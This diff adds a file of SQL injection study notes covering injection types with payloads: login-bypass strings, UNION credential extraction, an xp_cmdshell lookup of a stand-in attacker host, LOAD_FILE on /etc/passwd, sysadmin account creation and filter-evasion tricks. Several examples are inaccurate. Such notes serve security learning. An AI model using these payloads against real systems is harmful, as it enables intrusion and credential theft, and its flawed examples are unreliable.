@@ -1,0 +1,235 @@
+* What is SQL Injection?
+SQL Injection
+SQL Injection is an attack where malicious SQL code is inserted into input fields to manipulate the database, steal data, or bypass authentication.
+ *Why Bother About SQL Injection?
+These are impacts of SQL Injection:
+Authentication and Authorization Bypass – Attackers can log in as other users or gain unauthorized access.
+Information Disclosure – Sensitive data like user credentials or business details can be exposed.
+Compromised Integrity and Availability of Data – Attackers can alter or delete data, disrupting services.
+Remote Code Execution – Attackers can run malicious code on the server, escalating the attack.
+
+*Understanding HTTP POST Request?
+HTTP POST Request
+An HTTP POST request sends data to the server, typically used to submit forms or upload files. The data is sent in the body of the request, not visible in the URL.
+Example Use: Logging in, where a username and password are securely sent to the server.
+
+*Understanding Normal SQL Query ?
+Normal SQL Query
+A normal SQL query is a standard command used to interact with a database, such as retrieving, updating, inserting, or deleting data.
+Example:
+SELECT username, password FROM users WHERE id = 1;
+This query retrieves the username and password of a user with id = 1 from the users table.
+(Normal SQL Query Example)
+Imagine a school database that stores student names and grades.
+Scenario: You want to find the grade of a student named "Alice." SQL Query:
+SELECT grade FROM students WHERE name = 'Alice';
+Explanation:
+SELECT grade – Asks the database to show only the grade.
+FROM students – Specifies the table holding the data.
+WHERE name = 'Alice' – Filters the results to show data only for "Alice."
+Result: The database looks in the "students" table, finds "Alice," and returns her grade, like "A."
+
+
+*Example of a Web Application Vulnerable to SQL Injection: Attack Analysis?
+Example of a Web Application Vulnerable to SQL Injection
+Scenario: A login form asks for a username and password.
+Vulnerable SQL Query:
+SELECT * FROM users WHERE username = 'user' AND password = 'pass';
+How Attack Happens:
+The attacker inputs ' OR '1'='1 in both fields.
+The query becomes: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1';
+
+OR '1'='1' always evaluates as true, granting access without valid credentials.
+Impact: The attacker gains unauthorized access, bypassing the login.
+
+Types of SQL Injection:
+Error-based SQL Injection – Uses database error messages to gather information about the database structure.
+In-band SQL Injection – Uses the same communication channel to both launch the attack and retrieve data.
+Blind/Inferential SQL Injection – Attacker deduces information based on application behavior (true/false or time delay) without direct error messages or data output.
+Time Delay SQL Injection – Injects a query that causes a delay in the response (e.g., using SLEEP()), which helps infer data based on timing.
+Boolean Exploitation SQL Injection – Relies on true/false logic in SQL queries to infer information when direct output is unavailable.
+Heavy Query SQL Injection – Injects complex queries that heavily tax the database to extract large amounts of data or perform data manipulation.
+Out-of-Band SQL Injection – Uses a different channel (like DNS or HTTP) to send data back to the attacker, bypassing direct query output.
+UNION SQL Injection – Uses the UNION operator to combine the result of a legitimate query with data from other tables in the database.
+Tautology SQL Injection – Injects a tautological condition (e.g., 1=1), forcing the query to always return true, often used in bypassing login forms.
+End-of-Line Comment SQL Injection – Uses comments (--) to ignore the rest of the query and modify its behavior.
+Inline Comment SQL Injection – Injects comments within SQL queries to manipulate logic or suppress errors.
+Piggybacked Query SQL Injection – Attacker appends multiple SQL queries, executing commands without proper validation.
+System Stored Procedure SQL Injection – Uses database system stored procedures to execute arbitrary commands, such as file reads or system calls.
+Illegal/Logically Incorrect Query SQL Injection – Injects queries with malformed syntax that lead to errors revealing sensitive information or control of the application.
+These injection types exploit weaknesses in how web applications handle SQL queries, allowing attackers to manipulate or access data unlawfully.
+
+
+* What is Error Based SQL Injection?
+Error-Based SQL Injection
+Error-Based SQL Injection is an attack where the attacker manipulates input to trigger database errors, revealing sensitive information about the database structure or behavior.
+Example: Input: 1' Query:
+SELECT * FROM users WHERE id = '1'';
+Result: The database throws an error, exposing details like table names or query structure.
+
+*What is Blind/Inferential SQL Injection?
+Blind/Inferential SQL Injection
+Blind SQL Injection occurs when the database does not display errors or outputs directly, but attackers infer information by observing application behavior, such as true/false responses or time delays.
+Example:
+Input: 1' AND 1=1 -- (True condition, application works normally).
+Input: 1' AND 1=2 -- (False condition, application behaves differently).
+Attackers use this method to deduce database information without visible error messages.
+
+
+* what is Out-of-Band SQL Injection ?
+Out-of-Band SQL Injection
+Out-of-Band SQL Injection occurs when the attacker triggers a database to send data to a different server, often using techniques like DNS or HTTP requests, instead of directly receiving the data through the vulnerable web application. This method is used when error-based or blind injection is not effective.
+Example: An attacker might use a query like:
+SELECT * FROM users WHERE id = 1; EXEC xp_cmdshell('nslookup yourattacker.com');
+This makes the database send a DNS request to the attacker's server, revealing that the attack was successful.
+
+
+* What is Extracting Information through Error Messages?
+Extracting Information through Error Messages
+Extracting Information through Error Messages is an attack method where an attacker intentionally triggers errors in the application to reveal valuable details about the database structure, such as table names, column types, or SQL syntax. These errors can give attackers insights into the database, which they can exploit for further attacks.
+Example: Input: 1' AND 1=1 -- Resulting Error:
+SQL Error: Column 'username' not found in the table.
+The attacker learns that the username column exists, helping refine further attacks.
+
+
+*What is Perform Union SQL Injection?
+Perform Union SQL Injection
+Union SQL Injection is an attack where the attacker uses the UNION SQL operator to combine the results of the original query with data from other tables, allowing them to retrieve unauthorized data.
+Example: Original query:
+SELECT name, age FROM users WHERE id = 1;
+Attackers input:
+1' UNION SELECT username, password FROM admin -- 
+Explanation:
+UNION combines the results of the original query with data from the admin table.
+The attacker retrieves usernames and passwords from the admin table.
+This method lets attackers bypass restrictions and access unauthorized data.
+
+
+*Here’s a simple explanation of how to create user accounts in different database systems:
+Microsoft SQL Server: To create a user named "victor" with a password "Pass123" and give them full admin rights:
+First, create the login.
+Then, give them the highest level of permissions (admin).
+exec sp_addlogin 'victor', 'Pass123';
+exec sp_addsrvrolemember 'victor', 'sysadmin';
+Oracle: To create a user "victor" with a password "Pass123":
+Set up a user with space to store data.
+Give them basic rights to connect and use resources.
+CREATE USER victor IDENTIFIED BY Pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users;
+GRANT CONNECT TO victor;
+GRANT RESOURCE TO victor;
+Microsoft Access: To create a user "victor" with a password "Pass123":
+Just create the user with their password.
+CREATE USER victor IDENTIFIED BY 'Pass123';
+MySQL: To create a user "victor" with a password "Pass123" for use on the localhost:
+Add the user and set their password for local connections.
+INSERT INTO mysql.user (user, host, password) VALUES ('victor', 'localhost', PASSWORD('Pass123'));
+These commands are used to add a new user and assign them permissions in the respective database systems.
+
+
+** what is Interacting with the Operating System ?
+Interacting with the Operating System refers to the process where an attacker or user communicates with and controls the underlying operating system of a system through commands, scripts, or tools. This can involve gaining access to system resources, executing system commands, or modifying files and settings.
+
+Ways to Interact with the Operating System:
+Reading and Writing System Files from the Disk:
+What It Is: This involves accessing and modifying files stored on the system’s disk. It can be used for tasks like retrieving sensitive data or altering configuration files.
+Example: Reading system logs or writing a malicious script to a file for later execution.
+Direct Command Execution via Remote Shell:
+What It Is: This allows an attacker or user to send commands to the operating system remotely, often through a shell or terminal.
+Example: Using tools like SSH or a remote shell to run commands like ls, cat, or mkdir on a target machine.
+Both methods are used for interacting with the OS and can be part of system administration or hacking activities, depending on the context.
+
+
+*Interacting with the File System in MySQL:
+LOAD_FILE():
+What It Is: The LOAD_FILE() function in MySQL allows you to read the contents of a file stored on the MySQL server and return it as data.
+Example: SELECT LOAD_FILE('/etc/passwd');
+ This would read the content of the /etc/passwd file (on a Unix-like system) and display it.
+INTO OUTFILE():
+What It Is: The INTO OUTFILE() function in MySQL allows you to run a query and save the result directly into a file on the server’s filesystem.
+Example: SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/users.txt';
+ This would export the results of the users table into a file named users.txt on the server.
+Both functions allow you to interact with the file system from within MySQL, enabling reading and writing of files. This can be useful for administrators or attackers with the right privileges to access or store data externally.
+
+*What is Finding and Bypassing Admin Panel of a Website?
+Finding and Bypassing Admin Panel:
+SQL Injection: Trick the website by adding OR 1=1 -- to bypass login and get admin access without a password.
+URL Guessing: Try common URLs like example.com/admin to find the admin login page.
+Authentication Bypass: Use tricks like ' OR '1'='1' -- to bypass login checks and get in as an admin.
+' OR 1=1 --
+What It Does: This modifies the SQL query to always return true (1=1), allowing the attacker to bypass authentication and log in without a password.
+Example:
+Normal login query: SELECT * FROM users WHERE username = 'input' AND password = 'input'
+With injection: SELECT * FROM users WHERE username = '' OR 1=1 -- AND password = ''
+Since 1=1 is always true, the query allows access.
+' OR '1'='1' admin --
+What It Does: This injects a condition where '1'='1' is always true, bypassing the login check. The added "admin" might try to trick the system into giving admin access.
+Example: SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = ''
+" OR 0=0 --
+What It Does: This injects a condition where 0=0 is always true, allowing bypass of login.
+Example: SELECT * FROM users WHERE username = "" OR 0=0 -- AND password = ""
+' OR 0=0 --
+What It Does: Similar to the previous one, this ensures the query always returns true due to 0=0.
+Example: SELECT * FROM users WHERE username = '' OR 0=0 -- AND password = ''
+# OR 0=0 #
+What It Does: The # is used to comment out the rest of the SQL query. After that, 0=0 makes the condition always true.
+Example: SELECT * FROM users WHERE username = '' OR 0=0 # AND password = ''
+
+
+*What are the Injection Tools ?
+sqlmap Source: https://sqlmap.org  
+Mole Source: https://sourceforge.net
+Blisqy Source: https://github.com
+sqlmapchik Source: https://github.com 
+
+*Explain Types of Signature Evasion Techniques ?
+Types of Signature Evasion Techniques in SQL Injection:
+In-line Comment:
+Insert comments (--) between parts of the SQL query to confuse detection systems.
+Example: ' OR 1=1 --'
+Char Encoding:
+Use the CHAR() function to represent characters numerically to evade signature detection.
+Example: CHAR(79, 82, 49) represents OR1.
+String Concatenation:
+Break the SQL query into smaller parts and concatenate them using database-specific syntax.
+Example: ' OR '1'='1'
+Obfuscated Code:
+Make the SQL query hard to understand by inserting unnecessary code or complex logic.
+Example: ' OR (SELECT 1 FROM users WHERE username='admin')
+Manipulating White Spaces:
+Remove or add spaces in between SQL keywords to break detection patterns.
+Example: ' OR 1=1-- becomes ' OR 1=1 --.
+Hex Encoding:
+Represent characters as hexadecimal values to avoid detection.
+Example: %27 represents a single quote (').
+Sophisticated Matches:
+Use complex, non-standard SQL syntax to confuse the signature-based detection system.
+Null Byte Injection:
+Insert a null byte (%00) to terminate strings or bypass input filtering.
+Example: ' OR 1=1 %00
+Case Variation:
+Mix uppercase and lowercase letters to confuse case-sensitive detection systems.
+Example: oR 1=1
+Declare Variables:
+Declare variables in SQL and use them to pass crafted SQL statements, evading detection.
+Example: DECLARE @a VARCHAR(10)
+IP Fragmentation:
+Break up the data into multiple fragments so that the attack cannot be detected in one piece.
+URL Encoding:
+Encode characters in the URL (e.g., %27 for ') to bypass filters that block certain characters.
+Example: http://site.com/login.php?user=%27OR%201=1%27
+Here’s a simple explanation for each of the techniques:
+Null Byte (%00):
+What It Does: The null byte (%00) is used to terminate a string early, tricking the system into thinking the input is complete. This can bypass filters and detection.
+Example: username=' OR 1=1 %00 The %00 null byte ends the string and prevents detection after that point.
+Case Variation:
+What It Does: Mixes uppercase and lowercase letters in SQL keywords to evade signature-based detection systems that are case-sensitive.
+Example: oR 1=1 instead of OR 1=1 This changes the case but doesn't affect the SQL query’s meaning.
+Declare Variables:
+What It Does: Declares variables in the SQL query, which can then be used to pass specially crafted SQL statements to bypass detection systems.
+Example: DECLARE @var VARCHAR(100);
+SET @var = ' OR 1=1';
+EXEC(@var);
+ The variable is used to pass the injection payload dynamically.
+IP Fragmentation:
+What It Does: Splits the attack data into smaller fragments across multiple packets, making it harder for intrusion detection systems to detect the full attack.
+Example: This technique is used in network-level attacks, where the malicious payload is broken down into multiple segments that are reassembled later, bypassing filters.
